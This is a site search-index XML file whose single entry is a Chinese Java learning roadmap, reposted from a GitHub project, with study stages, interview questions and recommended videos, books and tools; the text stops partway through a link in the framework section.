<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA学习路线</title>
      <link href="/post/bc5fabe9.html"/>
      <url>/post/bc5fabe9.html</url>
      
        <content type="html"><![CDATA[<h1 id="Java-学习路线"><a href="#Java-学习路线" class="headerlink" title="Java 学习路线"></a>Java 学习路线</h1><blockquote><p>转自<a href="https://github.com/liyupi/code-roadmap/tree/main">https://github.com/liyupi/code-roadmap/tree/main</a></p><p>UP主：程序员鱼皮</p></blockquote><p>💂 + 💻 &#x3D; 👴🏽</p><p>建议先观看视频导读：<a href="https://www.bilibili.com/video/BV1Qf4y1K7ff/">https://www.bilibili.com/video/BV1Qf4y1K7ff/</a></p><h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><p><img src="/images/java-learning-road/image-20211127235325557.png" alt="image-20211127235325557"></p><h2 id="路线特点"><a href="#路线特点" class="headerlink" title="路线特点"></a>路线特点</h2><ol><li>最新，完整一条龙的大厂 Java 学习路线，从入门到入土</li><li>同时适用于想全面学习 &#x2F; 快速求职的同学，可以根据符号来定制自己的专属学习路线</li><li>给出目标、学习建议、关键知识点、最优资源以及各类资源推荐（视频、书籍、文档、项目、工具等）</li><li>鱼皮自己是 Java 开发者，融入个人自学和从业的经历 + 思考，让路线有灵魂</li><li>划分阶段、更有计划，且在最后给出持续学习的方向、探索 Java 程序员发展的无限可能</li><li>完全开源，回馈社区，持续更新！</li></ol><h2 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h2><p>可以通过路线知识点前的表情字符，根据自己的实际情况选择学习：</p><ul><li>🌕 所有同学必须学习！！！</li><li>🌖 非常急着找工作，才可不学；目标大厂，必须学习！</li><li>🌗 急着找工作的话，可不学；目标大厂，建议学习</li><li>🌘 时间充足的话，再去学</li><li>⭐ 表示推荐资源</li></ul><h2 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h2><p>首先呢，我们要了解 Java 的应用场景和就业方向，看看和自己的学习目的是否一致。</p><p>目前，Java 由于其优秀的特性以及火爆的生态，岗位需求量大，是后台开发、安卓开发、大数据开发的主流编程语言，因此学习资源也很丰富，值得学习！</p><p>有关更多编程语言的选择，大家可以看我的视频了解：<a href="https://www.bilibili.com/video/BV1y3411r7pX/">https://www.bilibili.com/video/BV1y3411r7pX/</a></p><h2 id="阶段-0：前期准备"><a href="#阶段-0：前期准备" class="headerlink" title="阶段 0：前期准备"></a>阶段 0：前期准备</h2><ol><li>准备好一款在线、随时随地写代码的工具，不用在本地去安装和配置，是初学者的好帮手。<ul><li>推荐网站 - 菜鸟工具：<a href="https://c.runoob.com/compile/10">https://c.runoob.com/compile/10</a></li></ul></li><li>准备一款记笔记的软件，学编程的过程中老师的思路、自己遇到的问题、解决问题的方法、心得感悟、遇到的好资料，都要记下来哦，好记性不如烂笔头，可以帮助你事半功倍。<ul><li>推荐本地软件 Typora：<a href="https://www.typora.io/">https://www.typora.io/</a> （线上可以用 xx 文档）</li><li>推荐使用 Markdown 语法编写，鱼皮教程：<a href="https://www.bilibili.com/video/BV1no4y1k7YT/">https://www.bilibili.com/video/BV1no4y1k7YT/</a></li></ul></li><li>想学好编程，别背代码，要多写，把这句话刻到脑子里。</li><li>选视频和找资料的小技巧：多看评论区、多看隔壁评论区、不要看过期的视频。</li><li>如何访问 GitHub：<a href="https://mp.weixin.qq.com/s/uBFsuThsZ4kdkZgqfX12qA">https://mp.weixin.qq.com/s/uBFsuThsZ4kdkZgqfX12qA</a> （上面有很多免费的编程学习资源、项目源码，程序员必备）</li></ol><h2 id="阶段-1：Java-入门"><a href="#阶段-1：Java-入门" class="headerlink" title="阶段 1：Java 入门"></a>阶段 1：Java 入门</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>培养兴趣、快速上手，能运行和编写简单的 Java 程序。</p><p>学完本阶段后，可以试着用 Java 解决一些数学计算问题、编写图书管理系统等桌面端 GUI 程序，甚至是五子棋之类的小游戏。</p><h3 id="🌕-Java-编程基础（45-天）"><a href="#🌕-Java-编程基础（45-天）" class="headerlink" title="🌕 Java 编程基础（45 天）"></a>🌕 Java 编程基础（45 天）</h3><h4 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h4><ul><li>Java 特点（看不懂没事，别背！）</li><li>环境搭建</li><li>IDEA 开发工具<ul><li>新建项目</li><li>运行调试</li><li>界面配置</li><li>插件管理</li></ul></li><li><strong>Java 基础语法</strong><ul><li>数据类型</li><li>流程控制</li></ul></li><li>数组</li><li><strong>面向对象</strong><ul><li>方法</li><li>重载</li><li>封装</li><li>继承</li><li>多态</li></ul></li><li>抽象类</li><li>接口</li><li>枚举</li><li>常用类<ul><li>String</li><li>日期时间</li></ul></li><li>集合类</li><li>泛型</li><li>注解</li><li>异常处理</li><li>多线程</li><li>IO 流</li><li>反射</li></ul><h4 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h4><p>初学一门语言时，一定要持续学习，不能中断！</p><p>想要学好编程，一定要多敲代码！建议先跟着书上的例子敲一遍代码，然后试着自主编写代码，并完成课后练习。</p><p>不理解代码也没关系，可以学习 Debug 后，一行一行地打断点执行，查看程序的执行过程。千万不要觉得麻烦，养成习惯后真的能节省很多重复学习的时间。</p><h4 id="经典面试题"><a href="#经典面试题" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>为什么重写 equals 还要重写 hashcode？</li><li>&#x3D;&#x3D; 和 equals 比较的区别</li><li>为啥有时会出现 4.0 - 3.6 &#x3D; 0.40000001 这种现象？</li><li>final 关键字的作用</li><li>介绍 Java 的集合类</li><li>ArrayList 和 LinkedList 的区别</li></ol><h4 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐ 韩顺平 - 零基础 30 天学会 Java：<a href="https://www.bilibili.com/video/BV1fh411y7R8">https://www.bilibili.com/video/BV1fh411y7R8</a> （900 多集，顺序安排很合理，每个知识真正的打碎了，通俗、有示例、有实战、有思想）</li></ul></li><li><p>文档</p><ul><li><p>⭐ 菜鸟教程：<a href="https://www.runoob.com/java/java-tutorial.html">https://www.runoob.com/java/java-tutorial.html</a> （可以在线练习）</p></li><li><p>廖雪峰 Java 教程：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744">https://www.liaoxuefeng.com/wiki/1252599548343744</a></p></li><li><p>IDEA 中文教程：<a href="https://github.com/judasn/IntelliJ-IDEA-Tutorial">https://github.com/judasn/IntelliJ-IDEA-Tutorial</a></p></li><li><p>IDEA Mac 快捷键指南，地址：<a href="https://www.jianshu.com/p/454c71172c46">https://www.jianshu.com/p/454c71172c46</a></p></li><li><p>IDEA Win 常用快捷键，地址：<a href="https://www.jianshu.com/p/5de7cca0fefc">https://www.jianshu.com/p/5de7cca0fefc</a></p></li></ul></li><li><p>书籍</p><ul><li>《Head First Java》</li></ul></li><li><p>在线游戏</p><ul><li>Codegym：<a href="https://codegym.cc/zh">https://codegym.cc/zh</a> （玩玩前几关培养兴趣不错，但后面收费了）</li></ul></li></ul><h3 id="🌖-Java-8（3-天）"><a href="#🌖-Java-8（3-天）" class="headerlink" title="🌖 Java 8（3 天）"></a>🌖 Java 8（3 天）</h3><h4 id="知识-1"><a href="#知识-1" class="headerlink" title="知识"></a>知识</h4><ul><li>Stream API</li><li>Lambda 表达式</li><li>新日期时间 API</li><li>接口默认方法</li></ul><h4 id="学习建议-1"><a href="#学习建议-1" class="headerlink" title="学习建议"></a>学习建议</h4><p>Java 8 是如今企业开发中最主流的 Java 稳定版本，在这个版本出现了很多实用的新特性，虽然面试考点不多，但能够提升编程效率，建议学习。</p><h4 id="经典面试题-1"><a href="#经典面试题-1" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>java 8 有哪些新特性？</li><li>HashMap 在 jdk 1.7 和 1.8 的区别？</li></ol><h4 id="资源-1"><a href="#资源-1" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐ 宋红康 - 全网最全Java零基础入门教程：<a href="https://www.bilibili.com/video/BV1Kb411W75N">https://www.bilibili.com/video/BV1Kb411W75N</a> （只看 Java 8 部分即可）</li></ul></li><li><p>文档</p><ul><li>⭐ 菜鸟教程：<a href="https://www.runoob.com/java/java8-new-features.html">https://www.runoob.com/java/java8-new-features.html</a></li></ul></li><li><p>书籍</p><ul><li>《Java 8 实战》</li></ul></li><li><p>工具</p><ul><li>⭐ 在线编写运行  Java 8：<a href="https://www.tutorialspoint.com/compile_java8_online.php">https://www.tutorialspoint.com/compile_java8_online.php</a></li></ul></li><li><p>其他</p><ul><li>Java 8 小代码片段：<a href="https://github.com/biezhi/30-seconds-of-java8">https://github.com/biezhi/30-seconds-of-java8</a></li></ul></li></ul><h3 id="练手项目"><a href="#练手项目" class="headerlink" title="练手项目"></a>练手项目</h3><ul><li>Java 实现简单计算器：<a href="https://www.lanqiao.cn/courses/185">https://www.lanqiao.cn/courses/185</a></li><li>Eclipse 实现 Java 编辑器：<a href="https://www.lanqiao.cn/courses/287">https://www.lanqiao.cn/courses/287</a></li><li>一本糊涂账：<a href="https://how2j.cn/module/104.html">https://how2j.cn/module/104.html</a></li><li>Java 五子棋：<a href="https://blog.csdn.net/cnlht/article/details/8176130">https://blog.csdn.net/cnlht/article/details/8176130</a></li><li>Java 中国象棋：<a href="https://blog.csdn.net/cnlht/article/details/8205733">https://blog.csdn.net/cnlht/article/details/8205733</a></li><li>JAVA GUI 图书馆管理系统：<a href="https://github.com/uboger/LibraryManager">https://github.com/uboger/LibraryManager</a></li><li>JAVA 坦克大战小游戏：<a href="https://github.com/wangzhengyi/TankWar">https://github.com/wangzhengyi/TankWar</a></li><li>Swing 编写的俄罗斯方块：<a href="https://github.com/HelloClyde/Tetris-Swing">https://github.com/HelloClyde/Tetris-Swing</a></li><li>小小记账本：<a href="https://github.com/xenv/SmallAccount">https://github.com/xenv/SmallAccount</a> （适合了解数据库的同学）</li></ul><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><p>学完了 Java 基础后，有些同学会感到迷茫了啊，感觉好像啥也做不出来，不知道下一步做什么，我这一身的本领该如何施展啊？</p><p>不要慌，也不要急着去学新技术，接下来我们要多用 Java 来写代码了，巩固基础，但是写什么呢？</p><p>当然是数据结构和算法！</p><h2 id="阶段-2：巩固基础"><a href="#阶段-2：巩固基础" class="headerlink" title="阶段 2：巩固基础"></a>阶段 2：巩固基础</h2><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h3><p>想学好编程，计算机基础知识要学好。</p><p>比如算法，是程序员的灵魂。学好算法有助于我们理解程序、开拓思路，因此也是很多公司面试时考察的关键，在找工作前，还是要刷个上百道算法题目的。</p><p>我们这个阶段的目标是：熟练使用 Java 语言来编写程序，巩固 Java 基础。（那直接用 Java 来写算法题目，一举两得，岂不美哉？）</p><p>此外，建议大家利用零碎时间多去了解 <strong>计算机基础知识</strong> ，比如操作系统、计算机网络等，对你后面学习开发框架之类的知识都有帮助。</p><h3 id="Java-基础（30-天）"><a href="#Java-基础（30-天）" class="headerlink" title="Java 基础（30 天）"></a>Java 基础（30 天）</h3><h4 id="学习建议-2"><a href="#学习建议-2" class="headerlink" title="学习建议"></a>学习建议</h4><p>建议大家去阅读 《Java 核心技术卷 1》，这本书堪称经典，是帮助你复习巩固  Java 的不二之选，其中图形界面章节可以选择不看。</p><p>之后可以刷牛客的 Java 练习题，检验自己的水平，我当时刷了两遍 1000 题（每天 30 题，1 个月也就刷完了，二刷会更快！）。虽然都是选择题，但能学到很多 Java 语言的特性、避免写代码时容易犯的错误。</p><p>如果你时间不够，只是想快速找到工作，那么本章节甚至可以完全跳过，后面慢慢弥补即可。</p><h4 id="资源-2"><a href="#资源-2" class="headerlink" title="资源"></a>资源</h4><ul><li>书籍<ul><li>⭐《Java 核心技术卷 1》</li></ul></li><li>练习<ul><li>⭐ 牛客题库：<a href="https://www.nowcoder.com/intelligentTest">https://www.nowcoder.com/intelligentTest</a></li></ul></li></ul><h3 id="🌖-数据结构与算法"><a href="#🌖-数据结构与算法" class="headerlink" title="🌖 数据结构与算法"></a>🌖 数据结构与算法</h3><h4 id="知识-2"><a href="#知识-2" class="headerlink" title="知识"></a>知识</h4><ul><li><p><strong>时间 &#x2F; 空间复杂度分析</strong></p></li><li><p>数据结构</p><ul><li>数组</li><li>字符串</li><li>队列</li><li>栈</li><li>链表</li><li>集合</li><li>哈希表</li><li>树<ul><li>二叉树</li><li>多叉树</li><li>字典树</li></ul></li></ul></li><li><p>算法</p><ul><li>排序</li><li>双指针</li><li>查找</li><li>分治</li><li>动态规划</li><li>递归</li><li>回溯</li><li>贪心</li><li>位运算</li><li>DFS</li><li>BFS</li><li>图</li></ul></li></ul><h4 id="学习建议-3"><a href="#学习建议-3" class="headerlink" title="学习建议"></a>学习建议</h4><p>学算法一定要多思考、多练习！！！</p><p>在复习 Java、巩固基础的过程中，每天可以坚持用 Java 做 2 - 3 道算法题目。</p><p>不用担心看不懂，直接进入 LeetCode 学习板块 LeetBook，提供了免费的教程，文字、图解、动画讲算法、在线练习应有尽有，从 0 开始，跟着学习基础知识、跟着教程刷一些同类题目，培养算法思路。</p><p>之后再由简单到复杂、由通过率高到低，自主刷题，多看题解，举一反三。一定要把自己做过的每道题目代码都自行保存好，定期复习。时间足够的话，也可以试着自己写写题解，在网上分享一下自己的刷题思路，找到自己坚持的动力。</p><p>有条件的朋友也可以试着参与竞赛，没什么门槛，可以帮助你集中精神，而且周赛的题目还是挺友好的~</p><h4 id="经典面试题-2"><a href="#经典面试题-2" class="headerlink" title="经典面试题"></a>经典面试题</h4><ul><li>LeetCode 精选 100 道：<a href="https://leetcode-cn.com/problem-list/2cktkvj/">https://leetcode-cn.com/problem-list/2cktkvj/</a></li><li>LeetCode 精选算法 200 题：<a href="https://leetcode-cn.com/problem-list/qg88wci/">https://leetcode-cn.com/problem-list/qg88wci/</a></li></ul><h4 id="资源-3"><a href="#资源-3" class="headerlink" title="资源"></a>资源</h4><ul><li>文章<ul><li>⭐ 刷了 1000 多道算法题，一点心得：<a href="https://t.1yb.co/oT9q">https://t.1yb.co/oT9q</a> （鱼皮原创）</li></ul></li><li>在线教程<ul><li>⭐ LeetCode LeetBook：<a href="https://leetcode-cn.com/leetbook/">https://leetcode-cn.com/leetbook/</a></li></ul></li><li>在线刷题<ul><li>⭐ LeetCode：<a href="https://leetcode-cn.com/">https://leetcode-cn.com/</a></li></ul></li><li>书籍<ul><li>⭐《小灰的漫画算法》</li><li>⭐《剑指 Offer》</li><li>《程序员代码面试指南》</li><li>图解算法数据结构：<a href="https://leetcode-cn.com/leetbook/detail/illustration-of-algorithm/">https://leetcode-cn.com/leetbook/detail/illustration-of-algorithm/</a></li><li>LeetCode 101（C++）：<a href="https://github.com/changgyhub/leetcode_101">https://github.com/changgyhub/leetcode_101</a></li><li>LeetCode 题解（C++）：<a href="https://github.com/soulmachine/leetcode">https://github.com/soulmachine/leetcode</a></li><li>LeetCode Cookbook（Go 语言）：<a href="https://github.com/halfrost/LeetCode-Go">https://github.com/halfrost/LeetCode-Go</a></li></ul></li><li>视频<ul><li>尚硅谷 Java 数据结构与算法：<a href="https://www.bilibili.com/video/BV1E4411H73v">https://www.bilibili.com/video/BV1E4411H73v</a> （难度比面试的要求大一些，适合希望更全面学习的朋友）</li><li>Leetcode 真题解析：<a href="https://www.bilibili.com/video/BV1a54y1b74k">https://www.bilibili.com/video/BV1a54y1b74k</a></li></ul></li><li>工具<ul><li>VisuAlgo 数据结构和算法动态可视化：<a href="https://visualgo.net/zh">https://visualgo.net/zh</a></li><li>数据结构可视化：<a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">https://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a></li><li>RegExr：<a href="https://www.code-nav.cn/rd/?rid=79550af2601114e9012110711798772b">https://www.code-nav.cn/rd/?rid=79550af2601114e9012110711798772b</a> （学习、创建和测试正则表达式的在线可视化工具）</li></ul></li><li>网站<ul><li>五分钟学算法：<a href="https://www.cxyxiaowu.com/">https://www.cxyxiaowu.com/</a></li></ul></li></ul><h3 id="🌘-计算机导论"><a href="#🌘-计算机导论" class="headerlink" title="🌘 计算机导论"></a>🌘 计算机导论</h3><h4 id="知识-3"><a href="#知识-3" class="headerlink" title="知识"></a>知识</h4><ul><li>计算机发展历史</li><li>计算机应用领域</li><li>计算机发展方向</li><li>计算机基本组成</li><li>二进制</li><li>编程语言发展</li></ul><h4 id="学习建议-4"><a href="#学习建议-4" class="headerlink" title="学习建议"></a>学习建议</h4><p>大学计算机专业的同学一般刚开学就会上这门课，虽说学习它并不会直接提高你的编程技能，但能够让你更了解计算机和编程，从而在一定程度上帮助你培养学习兴趣、确定学习方向。</p><p>自学的话，不用刻意去学习计算机导论，而是可以通过看视频、阅读课外读物的方式慢慢地了解计算机的故事。</p><h4 id="资源-4"><a href="#资源-4" class="headerlink" title="资源"></a>资源</h4><ul><li>视频<ul><li>《计算机科学速成课》：<a href="https://www.bilibili.com/video/BV1EW411u7th">https://www.bilibili.com/video/BV1EW411u7th</a> （从底层到上层的计算机知识科普，强烈推荐）</li></ul></li><li>书籍<ul><li>《半小时漫画计算机》</li></ul></li></ul><h3 id="🌖-操作系统"><a href="#🌖-操作系统" class="headerlink" title="🌖 操作系统"></a>🌖 操作系统</h3><h4 id="知识-4"><a href="#知识-4" class="headerlink" title="知识"></a>知识</h4><ul><li>操作系统的组成</li><li>进程、线程</li><li>进程 &#x2F; 线程间通讯方式</li><li>进程调度算法</li><li>进程 &#x2F; 线程同步方式</li><li>进程 &#x2F; 线程状态</li><li>死锁</li><li>内存管理</li><li>局部性原理</li></ul><h4 id="学习建议-5"><a href="#学习建议-5" class="headerlink" title="学习建议"></a>学习建议</h4><p>说实话，操作系统这一块知识挺枯燥的。你说说我现在项目都不会做，你又让我看这些理论，是不是想让我头秃？</p><p>我的建议是，可以先利用课余时间看一些网课或者有趣的课外书，对一些操作系统的概念先有个大致的印象，比如进程、线程、死锁，等后面有时间了再系统学习、等到找工作了再去背相关八股文。</p><p>还在校园就跟着学校的进度学习就成，自学的话可以看下《清华操作系统原理》视频，有实力的小伙伴，能看懂大黑书就更好了，但如果看不懂也别担心，这并不影响你后续知识的学习。</p><h4 id="经典面试题-3"><a href="#经典面试题-3" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>什么是死锁？死锁产生的条件？</li><li>线程有哪几种状态？</li><li>有哪些进程调度算法？</li><li>什么是缓冲区溢出？</li></ol><h4 id="资源-5"><a href="#资源-5" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>《清华操作系统原理》：<a href="https://www.bilibili.com/video/BV1uW411f72n">https://www.bilibili.com/video/BV1uW411f72n</a></li></ul></li><li><p>书籍</p><ul><li>《编码》</li><li>《30天自制操作系统》</li><li>《现代操作系统》（难度较大，不推荐新手看）</li><li>《深入理解计算机系统》（难度较大，不推荐新手看）</li><li>《 自己动手写操作系统》（国产好书，网上可以下载）</li></ul></li><li><p>大学课件</p><ul><li>浙大操作系统：<a href="https://github.com/QSCTech/zju-icicles">https://github.com/QSCTech/zju-icicles</a></li></ul></li></ul><h3 id="🌖-计算机网络"><a href="#🌖-计算机网络" class="headerlink" title="🌖 计算机网络"></a>🌖 计算机网络</h3><h4 id="知识-5"><a href="#知识-5" class="headerlink" title="知识"></a>知识</h4><ul><li>网络分层模型</li><li>网络传输过程</li><li>IP、端口</li><li>HTTP &#x2F; HTTPS 协议</li><li>UDP &#x2F; TCP 协议</li><li>ARP 地址解析协议</li><li>网络安全</li><li>DNS 域名解析</li></ul><h4 id="学习建议-6"><a href="#学习建议-6" class="headerlink" title="学习建议"></a>学习建议</h4><p>很多学习 Java 开发的同学最后都是从事 <strong>后端开发</strong> 的工作，而计算机网络知识是后端开发的重点。</p><p>和操作系统一样，自学网络可能会很枯燥，建议先看有趣的课外书，比如《图解 HTTP》；或者有趣的视频，比如《计算机网络微课堂》。后面要找工作面试前，再重点去背一些八股文就好了。还在学校的同学好好上课一般就没问题。</p><p>学习基础能帮助自己今后发展更稳定，且更容易接受新知识，所以请不要相信基础无用论。</p><h4 id="经典面试题-4"><a href="#经典面试题-4" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>计算机网络各层有哪些协议？</li><li>TCP 和 UDP 协议的区别？</li><li>TCP 为什么需要三次握手和四次挥手？</li><li>HTTP 和 HTTPS 协议的区别？</li></ol><h4 id="资源-6"><a href="#资源-6" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>《计算机网络微课堂》：<a href="https://www.bilibili.com/video/BV1c4411d7jb">https://www.bilibili.com/video/BV1c4411d7jb</a></li></ul></li><li><p>书籍</p><ul><li>⭐《图解 HTTP》</li><li>《网络是怎样连接的》</li><li>⭐《图解 TCP &#x2F; IP》</li></ul></li><li><p>大学课件</p><ul><li>浙大计算机网络基础：<a href="https://github.com/QSCTech/zju-icicles">https://github.com/QSCTech/zju-icicles</a></li></ul></li></ul><h3 id="尾声-1"><a href="#尾声-1" class="headerlink" title="尾声"></a>尾声</h3><p>巩固基础要花至少 1 个月的时间，当你读完《Java 核心技术卷1》并且不用查询文档也能熟练地用 Java 做题时，就可以接着往下了。</p><h2 id="阶段-3：Java-企业开发基础"><a href="#阶段-3：Java-企业开发基础" class="headerlink" title="阶段 3：Java 企业开发基础"></a>阶段 3：Java 企业开发基础</h2><h3 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h3><p>面向薪资编程，学习实际后台开发工作要用的基础技术和框架，并能 <strong>独立</strong> 做出一个具有完整功能的 Java Web 项目。</p><p>学完这个阶段后，你应该已经能独立开发出大多数常见的后台系统了，比如各种管理系统、商城系统等。</p><h3 id="🌕-MySQL-数据库（7-天）"><a href="#🌕-MySQL-数据库（7-天）" class="headerlink" title="🌕 MySQL 数据库（7 天）"></a>🌕 MySQL 数据库（7 天）</h3><p>企业中大部分业务数据都是用关系型数据库存储的，因此数据库是后台开发同学的必备技能，其中 MySQL 数据库是目前的主流，也是面试时的重点。</p><h4 id="知识-6"><a href="#知识-6" class="headerlink" title="知识"></a>知识</h4><ul><li>基本概念</li><li>MySQL 搭建</li><li>SQL 语句编写</li><li>约束</li><li>索引</li><li>事务</li><li>锁机制</li><li>设计数据库表</li><li>性能优化</li></ul><h4 id="学习建议-7"><a href="#学习建议-7" class="headerlink" title="学习建议"></a>学习建议</h4><p>其中，<strong>SQL 语句编写</strong> 和 <strong>设计数据库表</strong> 这两个能力一定要有！</p><p>比如让你做一个学生管理系统，你要能想到需要哪些表，比如学生表、班级表；每个表需要哪些字段、字段类型。</p><p>这就要求大家多写 SQL、多根据实际的业务场景去练习设计能力。</p><h4 id="经典面试题-5"><a href="#经典面试题-5" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>MySQL 索引的最左原则</li><li>InnoDB 和 MyIsam 引擎的区别？</li><li>有哪些优化数据库性能的方法？</li><li>如何定位慢查询？</li><li>MySQL 支持行锁还是表锁？分别有哪些优缺点？</li></ol><h4 id="资源-7"><a href="#资源-7" class="headerlink" title="资源"></a>资源</h4><ul><li>视频<ul><li>⭐ 老杜 - mysql入门基础 + 数据库实战：<a href="https://www.bilibili.com/video/BV1Vy4y1z7EX">https://www.bilibili.com/video/BV1Vy4y1z7EX</a> （较新、内容相对精炼，有习题）</li><li>尚硅谷 - MySQL基础教程：<a href="https://www.bilibili.com/video/BV1xW411u7ax">https://www.bilibili.com/video/BV1xW411u7ax</a> （小姐姐讲课，但感觉音质一般）</li></ul></li><li>在线练习<ul><li>⭐ SQL 自学网：<a href="http://xuesql.cn/">http://xuesql.cn/</a></li><li>⭐ SQL 在线运行：<a href="https://www.bejson.com/runcode/sql/">https://www.bejson.com/runcode/sql/</a></li></ul></li><li>文档<ul><li>SQL - 菜鸟教程：<a href="https://www.runoob.com/sql/sql-tutorial.html">https://www.runoob.com/sql/sql-tutorial.html</a></li><li>MySQL - 菜鸟教程：<a href="https://www.runoob.com/mysql/mysql-tutorial.html">https://www.runoob.com/mysql/mysql-tutorial.html</a></li></ul></li><li>网站<ul><li><a href="https://www.code-nav.cn/rd/?rid=b00064a76012546b016e274a3724c5f0">数据库大全</a>：果创云收录的各种数据库表设计</li></ul></li></ul><h3 id="🌕-开发框架（60-天）"><a href="#🌕-开发框架（60-天）" class="headerlink" title="🌕 开发框架（60 天）"></a>🌕 开发框架（60 天）</h3><p>Java 之所以能成为主流的企业开发语言，很大一部分原因是它完善的框架生态，用好框架，不仅能够大大提升开发效率，还能提高项目的稳定性、减少维护成本。</p><p>开发框架是后台开发工作中不可或缺的，也是面试考察的重点，一定要好好学！</p><p>不知道 Java 能做什么的朋友们，学完开发框架，就会有答案啦。</p><p>下面给大家推荐的都是企业中应用最多的主流开发框架，知识点比较零碎，就放在一起讲了。</p><h4 id="知识-7"><a href="#知识-7" class="headerlink" title="知识"></a>知识</h4><h5 id="🌕-Java-Web"><a href="#🌕-Java-Web" class="headerlink" title="🌕 Java Web"></a>🌕 Java Web</h5><ul><li><p>描述：Java 网页应用开发基础</p></li><li><p>一丢丢前端基础</p></li><li><p>XML</p></li><li><p>JSON</p></li><li><p>Servlet</p></li><li><p>Filter</p></li><li><p>Listener</p></li><li><p>JSP</p></li><li><p>JSTL</p></li><li><p>Cookie</p></li><li><p>Session</p></li></ul><h5 id="🌕-Spring-5"><a href="#🌕-Spring-5" class="headerlink" title="🌕 Spring 5"></a>🌕 Spring 5</h5><ul><li>描述：Java 轻量级应用框架</li><li>IOC</li><li>AOP</li><li>事务</li></ul><h5 id="🌕-SpringMVC"><a href="#🌕-SpringMVC" class="headerlink" title="🌕 SpringMVC"></a>🌕 SpringMVC</h5><ul><li>描述：Java 轻量级 web 开发框架</li><li>什么是 MVC？</li><li>请求与响应</li><li>Restful API</li><li>拦截器</li><li>配置</li><li>执行过程</li></ul><h5 id="🌕-MyBatis"><a href="#🌕-MyBatis" class="headerlink" title="🌕 MyBatis"></a>🌕 MyBatis</h5><ul><li>描述：数据访问框架，操作数据库进行增删改查等操作</li><li>增删改查</li><li>全局配置</li><li>动态 SQL</li><li>缓存</li><li>和其他框架的整合</li><li>逆向工程</li></ul><h5 id="🌗-MyBatis-Plus"><a href="#🌗-MyBatis-Plus" class="headerlink" title="🌗 MyBatis Plus"></a>🌗 MyBatis Plus</h5><ul><li>描述：Mybatis 的增强工具，能够简化开发、提高效率</li><li>引入</li><li>通用 CRUD</li><li>条件构造器</li><li>代码生成器</li><li>插件扩展</li><li>自定义全局操作</li></ul><h5 id="🌕-SpringBoot-2"><a href="#🌕-SpringBoot-2" class="headerlink" title="🌕 SpringBoot 2"></a>🌕 SpringBoot 2</h5><ul><li>描述：简化 Spring 应用的初始搭建以及开发过程，提高效率</li><li>常用注解</li><li>资源整合</li><li>高级特性</li><li>本地热部署</li></ul><h5 id="🌗-Spring-Security"><a href="#🌗-Spring-Security" class="headerlink" title="🌗 Spring Security"></a>🌗 Spring Security</h5><ul><li>描述：Spring 的安全管理框架</li><li>用户认证</li><li>权限管理</li><li>相关技术：Shiro</li></ul><h5 id="🌗-Maven-x2F-Gradle"><a href="#🌗-Maven-x2F-Gradle" class="headerlink" title="🌗 Maven &#x2F; Gradle"></a>🌗 Maven &#x2F; Gradle</h5><ul><li>描述：项目管理工具</li><li>构建</li><li>依赖管理</li><li>插件</li><li>配置</li><li>子父工程</li><li>多模块打包构建</li><li>Nexus 私服搭建</li></ul><h4 id="学习建议-8"><a href="#学习建议-8" class="headerlink" title="学习建议"></a>学习建议</h4><p>由于技术较多，且框架之间存在一定的联系，因此建议大家看同一系列的视频教程（尚硅谷、狂神说等等都可以），以保证学习内容的连续以及体验上的一致。</p><p>学这些技术的时候，<strong>千万不能懒</strong> ！一定要多记笔记，并且跟着老师写代码。原理部分不要太过纠结，先以能跟着敲出代码、写出可运行的项目为主，有些东西做出来也能帮助你更好地理解理论。</p><p>学习顺序挺重要的，建议按我推荐的顺序学，不要一上手就学 Spring Boot。只有先学习下自己整合框架的方法，才能帮你理解 SpringBoot 解决的问题，感受到它的方便和高效。</p><p>Maven &#x2F; Gradle 当成工具用就好，面试基本不问，跟着框架教程去用就行了，急着找工作的话，先不用花太多时间去深入学。大厂面试问这个的也不多。</p><h4 id="经典面试题-6"><a href="#经典面试题-6" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>Spring 的 IOC 和 AOP 是什么，有哪些优点？</li><li>Spring 框架用到了哪些设计模式？</li><li>介绍 Spring Bean 的生命周期</li><li>MyBatis 如何实现延迟加载？</li><li>介绍 MyBatis 的多级缓存机制</li></ol><h4 id="资源-8"><a href="#资源-8" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频（按顺序看）</p><ul><li><p>⭐ 尚硅谷最新版 JavaWeb 全套教程：<a href="https://www.bilibili.com/video/BV1Y7411K7zz">https://www.bilibili.com/video/BV1Y7411K7zz</a> （前端部分最好也看下）</p></li><li><p>⭐ 尚硅谷 - Spring 5 框架最新版教程（idea版）：<a href="https://www.bilibili.com/video/BV1Vf4y127N5">https://www.bilibili.com/video/BV1Vf4y127N5</a></p></li><li><p>⭐ 尚硅谷 - SpringMVC 2021 最新教程：<a href="https://www.bilibili.com/video/BV1Ry4y1574R">https://www.bilibili.com/video/BV1Ry4y1574R</a></p></li><li><p>⭐ 尚硅谷 - MyBatis 实战教程全套完整版：<a href="https://www.bilibili.com/video/BV1mW411M737">https://www.bilibili.com/video/BV1mW411M737</a></p></li><li><p>⭐ 尚硅谷 - MyBatisPlus 教程：<a 